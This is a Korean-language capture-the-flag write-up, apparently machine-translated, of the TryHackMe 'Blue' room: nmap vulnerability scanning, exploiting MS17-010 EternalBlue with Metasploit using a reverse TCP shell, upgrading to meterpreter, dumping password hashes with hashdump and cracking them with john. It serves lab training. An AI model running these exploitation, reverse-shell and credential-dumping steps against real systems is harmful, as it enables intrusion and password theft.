---
title: "TryHackMe  Blue 네트워크 침투 테스트 배우기"
description: ""
coverImage: "/assets/img/2024-06-23-TryHackMeBlue_0.png"
date: 2024-06-23 15:53
ogImage: 
  url: /assets/img/2024-06-23-TryHackMeBlue_0.png
tag: Tech
originalTitle: "TryHackMe — Blue"
link: "https://medium.com/@hackshobgoblin/tryhackme-blue-6e62789bad02"
---


방 정보: https://tryhackme.com/r/room/blue

도구: nmap, metasploit framework, john

과제 1 Recon

아래의 질문에 답해주세요:

<div class="content-ad"></div>

기계를 스캔해보세요.

```js
nmap -sVC -T4 -p- --open 10.10.66.134 -oN blue.nmap
```

![이미지](/assets/img/2024-06-23-TryHackMeBlue_0.png)

- 버전 및 기본 스크립트 스캔을 위한 sVC
- 상대적으로 빠른 스캔을 위한 T4
- 모든 65,535 포트를 스캔하기 위한 -p-
- 열려 있는 포트만 표시하기 위한 -- open
- 결과를 nmap 형식으로 출력하기 위한 -oN

<div class="content-ad"></div>

포트 번호가 1000 미만인 오픈 포트가 몇 개나 있나요? 3개입니다.

이 기기는 어떤 취약성이 존재하나요? 이 기기가 취약하게 만드는 요인을 찾기 위해서는 열린 포트에 대해 추가로 스캔을 실행해야 합니다.

```js
nmap -p 135,139,445 --script=vuln 10.10.66.134
```

- -p 옵션은 스캔할 포트를 설정하는데, 포트를 입력할 때는 콤마로 구분합니다.
- --script=vuln은 지정한 포트에 대해 기본 취약성 스캔을 실행합니다.

<div class="content-ad"></div>

<img src="/assets/img/2024-06-23-TryHackMeBlue_1.png" />

여기서 볼 수 있듯이, 이 머신은 ms17-010 취약점이 있습니다.

작업 2: 액세스 얻기

해당 머신을 공격하여 발판을 만듭니다.

<div class="content-ad"></div>

메타스플로잇을 시작해주세요.

```js
msfconsole -q
```

기계에 대해 실행할 악용 코드를 찾아보세요. 코드의 전체 경로는 무엇인가요? (예: exploit/......)

우리는 취약점에 적합한 악용 코드를 찾기 위해 다음 명령을 실행할 것입니다.

<div class="content-ad"></div>

```js
search ms17-010
```

![TryHackMeBlue_2](/assets/img/2024-06-23-TryHackMeBlue_2.png)

답변: exploit/windows/smb/ms17_010_eternalblue

알겠어요. 원하는 업적을 선택하기 위해 다음 명령을 실행하면 됩니다:

<div class="content-ad"></div>


사용 0

사용은 모듈을 선택하는 것이며, 우리는 사용하려는 모듈의 번호가 0이기 때문에 0을 선택합니다. 이해했어요? ;) Metasploit은 매우 논리적인 구문을 가지고 있어서 우리에게 일을 쉽게 만들어줍니다.

![이미지](/assets/img/2024-06-23-TryHackMeBlue_3.png)

그럼 이제 선택한 모듈로 Metasploit은 자동으로 페이로드를 선택합니다. 이 경우, windows/x64/meterpreter/reverse_tcp를 선택합니다. 우리는 windows/x64/shell/reverse_tcp를 사용하여 미터프리터 셸로 업그레이드 할 것입니다.


<div class="content-ad"></div>

자, payload를 설명해 드리겠습니다. 이것은 x64 아키텍처를 사용하는 Windows 기기를 위한 payload로, 기본 Windows 셸을 이용한 역방향 tcp 셸입니다. 역쉘은 우리 기기에 리스너를 설정하고 대상으로부터 연결을 받을 때 얻는 것으로, 이를 통해 해당 기기에서 명령을 실행할 수 있게 됩니다.

다음과 같이 3가지 옵션을 설정해야 합니다:

- RHOSTS — 피해 기기의 IP 주소 또는 호스트 이름
- LHOST — 우리가 수신 대기하는 호스트; VPN IP 또는 tun0 IP 주소 (공격 상자에서 이를 설정할 필요가 없을 수도 있지만 정확한 IP임을 확인해야 합니다. 그렇지 않으면 피해 기기로부터 연결을 받을 수 없습니다.)
- payload — windows/x64/shell/reverse_tcp

이를 실행하여 설정할 수 있습니다:

<div class="content-ad"></div>


set rhosts [피해자 IP]
set lhost [tun0 IP 또는 공격 상자 IP]
set payload windows/x64/shell/reverse_tcp


위 단계를 마치면 옵션을 실행하여 설정한 모든 옵션을 확인하여 올바른지 확인할 수 있습니다.

![이미지](/assets/img/2024-06-23-TryHackMeBlue_4.png)

또한 언급을 잊은 더 하나의 옵션을 설정할 수 있습니다. 그것은 목표입니다.


<div class="content-ad"></div>

피해자 기기의 운영 체제를 알고 있기 때문에 다음 명령을 실행할 수 있습니다:

```js
show targets
set target 1
```

![image](/assets/img/2024-06-23-TryHackMeBlue_5.png)

여기에는 취약점에 대한 사용 가능한 대상이 표시되며, 우리가 원하는 대상을 설정합니다. 이 경우 Windows 7입니다.

<div class="content-ad"></div>

그럼 이제 우리가 해야 할 일은 목표에 대한 공격을 실행하기 위해 "run" 또는 "exploit" 명령을 실행하는 것입니다.

![이미지](/assets/img/2024-06-23-TryHackMeBlue_6.png)

이제 피해자에서 명령을 실행할 수 있으며, 우리는 NT AUTHORITY\SYSTEM의 최고 권한을 가지고 있습니다.

작업 3 승격

<div class="content-ad"></div>

권한을 높이고, Metasploit에서 쉘을 업그레이드하는 방법을 배워봅시다.

이미 얻은 쉘을 백그라운드로 돌린 적이 없다면 (CTRL + Z)를 누르세요. 온라인에서 Metasploit에서 쉘을 meterpreter 쉘로 변환하는 방법에 대해 조사해보세요. 사용할 포스트 모듈의 이름은 무엇인가요? (이전에 선택한 exploit과 유사한 정확한 경로)

쉘을 업그레이드하기 위해 다음과 같이 shell_to_meterpreter를 검색해봅시다:

```js
search shell_to_meterpreter
```

<div class="content-ad"></div>

`post/multi/manage/shell_to_meterpreter` 모듈의 전체 경로입니다.

다시 한번 말씀드리지만, 올바른 모듈을 선택하려면 use 0을 실행하면 됩니다.

이후, 올바른 세션 ID를 설정하면 됩니다.

<div class="content-ad"></div>

위 표를 Markdown 형식으로 변경해주세요.

<div class="content-ad"></div>


```js
세션이 설정되었습니다: 1
```

그리고 기본 Windows 쉘을 미터프리터 쉘로 업그레이드하려면 단순히 run 명령을 입력하세요. 미터프리터 쉘은 우리에게 추가적인 도구와 모듈을 제공하여 더 나은 후방탐색에 활용할 수 있습니다. 이것은 Metasploit Framework 쉘입니다.

![이미지](/assets/img/2024-06-23-TryHackMeBlue_9.png)

우리는 성공적으로 쉘을 미터프리터 쉘로 업그레이드했지만 자동으로 백그라운드로 이동되었는 것으로 보입니다. 따라서 다시 한 번 세션 목록을 보고, 세션 2를 실행하여 세션 2로 이동해야 합니다. 이것이 바로 우리의 미터프리터 세션입니다.


<div class="content-ad"></div>

getuid을 실행하면 여전히 NT AUTHORITY\SYSTEM 컨텍스트에서 명령을 실행 중이라는 것을 확인할 수 있습니다.


![이미지](/assets/img/2024-06-23-TryHackMeBlue_10.png)


'ps' 명령을 사용하여 실행 중인 모든 프로세스를 나열하세요. 우리가 시스템이라고 해서 우리의 프로세스가 항상 시스템일 필요는 없습니다. 이 목록 맨 아래에 NT AUTHORITY\SYSTEM으로 실행되는 프로세스를 찾아서 해당 프로세스 ID(왼쪽 열)를 적어두세요.

"getpid" 명령을 실행하면 현재 실행 중인 프로세스 ID를 확인할 수 있습니다. 그런 다음 해당 프로세스 ID에 연결된 프로세스가 무엇인지 확인하기 위해 다시 ps를 실행할 수 있습니다.

<div class="content-ad"></div>

이미지 태그를 Markdown 형식으로 변경해주세요.

<img src="/assets/img/2024-06-23-TryHackMeBlue_11.png" />

우리는 우리의 프로세스 ID가 powershell.exe에 속하고 NT AUTHORITY\SYSTEM으로 실행 중임을 볼 수 있습니다.

작업 4 크래킹

기본 사용자가 아닌 사용자의 암호를 덤프하고 크래킹해보세요!

<div class="content-ad"></div>

우리의 고급 meterpreter 쉘 안에서 'hashdump' 명령을 실행해주세요. 이렇게 하면 올바른 권한이 있을 때 기계의 모든 비밀번호가 덤프됩니다. 기본 사용자가 아닌 사용자의 이름은 무엇인가요?

![사용자 이미지](/assets/img/2024-06-23-TryHackMeBlue_12.png)

이 질문의 답은 Jon이에요.

이 비밀번호 해시를 파일로 복사하고 이를 해독하는 방법에 대해 조사해보세요. 해독된 비밀번호는 무엇인가요?

<div class="content-ad"></div>

이 해시를 처리하려면 해시 (마지막 “:” 이후의 해시 부분 만 필요합니다)를 "hash.txt"라는 파일에 즐겨 사용하는 텍스트 편집기를 통해 추가 한 후 다음 명령을 사용하여 john을 사용하여 해시를 해독 할 수 있습니다.

```js
john hash.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
```

- — format은 우리가 해독하려는 해시의 형식을 지정합니다; NT는이 해시의 형식입니다.
- — wordlist는 해독에 사용할 워드리스트를 지정합니다; rockyou.txt가 우리의 목적에 완벽합니다.

그럼 그 명령을 실행하면 Jon 사용자의 비밀번호를 얻게 될 것입니다.

<div class="content-ad"></div>

태스크 5 깃발 찾기!

이 기계에 심어 둔 세 깃발을 찾아보세요. 이 깃발은 전통적인 깃발이 아니라 Windows 시스템 내의 주요 위치를 나타내기 위해 만들어 졌습니다. 아래 제공된 힌트를 사용하여 이 방을 완료하세요!

깃발1? 이 깃발은 시스템 루트에서 찾을 수 있습니다.

깃발2? 이 깃발은 Windows 내에서 비밀번호가 저장되는 위치에서 찾을 수 있습니다.

<div class="content-ad"></div>

*오류: Windows는이 깃발의 위치를 싫어하고 때때로 삭제할 수 있습니다. 이 깃발을 찾으려면 몇 가지 경우에는 컴퓨터를 종료/다시 시작하고 공격을 다시 실행해야 할 수도 있습니다. 그러나 상대적으로 드물게 발생할 수 있습니다.

flag3? 이 깃발은 루팅하기에 훌륭한 위치에 있을 수 있습니다. 왜냐하면 일반적으로 관리자들은 흥미로운 것들을 많이 저장하기 때문입니다.

당신의 깃발을 제출하면 됩니다! 깃발을 찾으면 다음 명령을 실행하여 내용을 읽어보세요:

```js
type [깃발.txt의 이름]
```

<div class="content-ad"></div>

읽어주셔서 감사합니다 😊